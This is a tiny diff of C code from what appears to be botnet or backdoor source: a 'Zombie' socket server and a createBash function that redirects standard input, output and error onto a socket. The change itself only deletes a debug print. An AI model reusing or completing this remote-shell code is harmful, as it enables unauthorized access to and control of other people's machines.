@@ -43,7 +43,6 @@ Zombie initSocketServer(bool withPort, int portReceived){
 }
 
 void createBash (void * sock){
-	printf("new\n");
 	int* socket = sock;
 	for (int i = 0; i < 3; ++i){
 		dup2(*socket,i);
